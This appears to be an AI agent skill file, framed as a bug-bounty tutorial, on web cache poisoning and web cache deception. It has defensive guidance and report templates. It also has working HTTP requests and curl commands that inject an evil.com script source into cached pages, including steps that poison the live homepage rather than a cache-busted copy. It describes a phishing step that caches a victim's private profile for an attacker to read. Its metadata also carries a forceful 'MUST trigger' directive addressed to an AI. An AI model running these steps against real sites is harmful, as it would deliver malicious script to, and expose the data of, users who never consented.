---
name: web-cache-poisoning-deception
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit Web Cache Poisoning vulnerabilities by manipulating unkeyed inputs (HTTP headers,
  hostnames) to force a caching server (CDN or reverse proxy) to save a malicious response and serve
  it to all subsequent users requesting the same legitimate URL.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0040]
  techniques: [T1190, T1498]
platforms: [linux, windows]
tags: [web-cache-poisoning, unkeyed-inputs, cdn-security, xss, cache-deception, bug-hunting]
tools: [burpsuite, paraminer]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Web Cache Poisoning

## When to Use
- When targeting high-traffic web applications utilizing aggressive content caching layers like Cloudflare, Fastly, Akamai, or Varnish.
- When you discover Cross-Site Scripting (XSS) or Open Redirect vulnerabilities that rely on HTTP headers (e.g., `X-Forwarded-Host`) rather than URL parameters.
- To execute a mass-scale attack where exploiting the cache server once compromises thousands of innocent users visiting standard pages (like `/index.html`).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Cache Architecture Reconnaissance

```http
# Concept: You need to understand how the cache server identifies identical requests.
# CDNs usually "key" a cache based on the URL path and the Host header.
# "Unkeyed" inputs are headers the cache IGNORES when matching files, but the 
# BACKEND application still processes.

# 1. Identify active caching by looking at HTTP response headers:
HTTP/1.1 200 OK
X-Cache: HIT      # Indicates the response came from the cache
Age: 15           # Indicates the cached file is 15 seconds old
Cache-Control: public, max-age=1800 # Time-to-Live is 30 minutes

# 2. Bust the cache for safe testing (Crucial Rule!)
# Always append a random query parameter so you don't poison production traffic while testing.
GET /?cb=xyz123 HTTP/1.1
```

### Phase 2: Finding Unkeyed Inputs (Param Miner)

```text
# Concept: We need to find HTTP headers that alter the backend response without 
# altering the cache key.

# 1. Use the "Param Miner" extension in Burp Suite Professional.
# Right-click request -> Extensions -> Param Miner -> "Guess headers".

# 2. Example Manual Probing:
GET /?cb=xyz123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 3. Analyze the Backend Response:
HTTP/1.1 200 OK
<script src="https://evil.com/static/vendor.js"></script>

# Discovery: The backend dynamically generated a <script> tag based on our 
# `X-Forwarded-Host` header. Because `X-Forwarded-Host` is unkeyed, this is highly vulnerable.
```

### Phase 3: Exploiting the Web Cache Poisoning

```text
# Goal: Force the CDN to save our malicious response and serve it to everyone.

# 1. Prepare your malicious payload server (evil.com/static/vendor.js)
# File contains: alert(document.domain)

# 2. Execute the Poisoning (Targeting the live, non-cache-busted path)
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Keep sending this request until the cache TTL expires (or the cache drops).
# Eventually, the CDN will forward your request to the backend.
# The backend will respond with the malicious script source.
# The CDN will save (HIT) this response into the cache for the key `GET target.com/`.

# 3. Verification:
# Load the homepage normally in your browser.
GET / HTTP/1.1
Host: target.com

# The page loads, but XSS executes immediately because the CDN served the poisoned cached copy.
```

### Phase 4: Web Cache Deception (A Different Attack)

```text
# Concept: Instead of poisoning a public page, trick a victim into caching their 
# PRIVATE data on a PUBLIC, static path.

# Scenario: The CDN caches all `.css` files ignoring query params or cookies.
# Normal request: `GET /profile` -> Cache: MISS (Private data)
# Malicious request: `GET /profile/avatar.css` -> Cache: HIT (Because of .css extension)

# 1. Attacker sends phishing link to victim: 
# https://target.com/profile/avatar.css

# 2. Victim clicks link. The backend ignores `/avatar.css` as a routing error and 
# serves the victim's private `/profile` dashboard data.

# 3. The CDN sees the `.css` extension on the URL, assumes it's static public content, 
# and CACHES the victim's private profile HTML!

# 4. Attacker navigates to `https://target.com/profile/avatar.css` and views the victim's cached profile.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Caching Architecture] --> B{Does application reflect custom headers?}
    B -->|Yes| C[Test X-Forwarded-Host, X-Original-URL]
    C --> D{Does response vary based on header?}
    D -->|Yes| E[Execute Poisoning to store XSS in cache]
    B -->|No| F{Does CDN cache based on file extensions?}
    F -->|Yes| G[Test Web Cache Deception by appending .css to private endpoints]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Strict Cache Keys**: Ensure that any HTTP header used by the backend application to alter the response (e.g., `X-Forwarded-Host`, `Origin`) is explicitly added to the CDN's cache key configuration (the "Vary" header).
- **Disable Risky Headers**: If your application does not rely on `X-Forwarded-Host` or `X-Original-URL`, configure the edge proxy reverse proxy to drop those headers entirely before they reach the backend application.
- **Strict Routing (Defense against Deception)**: The backend application framework must implement strict routing. A request to `/profile/style.css` must return a 404 error if that file does not exist, rather than gracefully degrading and rendering the user's dashboard data.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Web Cache Poisoning | Manipulating a cache into storing malicious content and serving it to users |
| Web Cache Deception | Tricking a user into forcing the cache to save their sensitive, private content on a publicly accessible cached path |
| Unkeyed Input | HTTP headers or parameters that a CDN completely ignores when deciding if a request matches a stored cached file |
| Cache Busting | Adding a random query parameter to ensure a request bypasses existing cached files and fetches fresh data |

## Output Format
```
Bug Bounty Report: Stored XSS via Web Cache Poisoning
=====================================================
Vulnerability: Web Cache Poisoning resulting in Stored XSS
Severity: High (CVSS 8.2)
Target: GET /dashboard

Description:
The application's Cloudflare caching configuration relies heavily on the URL path but ignores the `X-Forwarded-Host` HTTP header (unkeyed input). The backend application uses this header to dynamically rewrite resource paths. By sending a request with a malicious `X-Forwarded-Host` header precisely when the cache expires, an attacker can poison the `/dashboard` path. 

Reproduction Steps:
1. Identify the cache expiration timer via the `Age` HTTP response header.
2. Send the following request precisely as the cache hits 0:
   GET /dashboard HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil-attacker.com
3. The Cloudflare edge node requests the page from the backend. The backend constructs the page with `<script src="https://evil-attacker.com/app.js">`.
4. Cloudflare caches this payload.
5. All corporate users navigating to `/dashboard` for the next 30 minutes are served the malicious script, executing XSS.

Impact:
Mass-scale Account Takeover. Exploitation requires zero interaction from the victim other than visiting the legitimate landing page.
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (Web Cache Poisoning)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Multiple HackerOne** | $3K-$15K | (Various) | Unkeyed headers → cache poisoning → mass XSS delivery | 2023-2025 |

**Key Lesson**: Web cache poisoning via unkeyed headers (X-Forwarded-Host, X-Original-URL) 
can turn a reflected XSS into a stored/persistent attack affecting all users who hit the 
cached response. James Kettle's research at PortSwigger is the definitive reference.

**The technique that actually works:**
```bash
# 1. Find unkeyed headers
curl -H "X-Forwarded-Host: evil.com" https://target.com/ -v
# If response includes evil.com in links/scripts → poisonable

# 2. Poison the cache
curl -H "X-Forwarded-Host: evil.com/xss.js" https://target.com/static/page

# 3. Verify: normal request returns poisoned response
curl https://target.com/static/page
# If the cached response includes evil.com → confirmed cache poisoning
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- PortSwigger: [Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- HackTricks: [Cache Deception & Poisoning](https://book.hacktricks.xyz/pentesting-web/cache-deception)
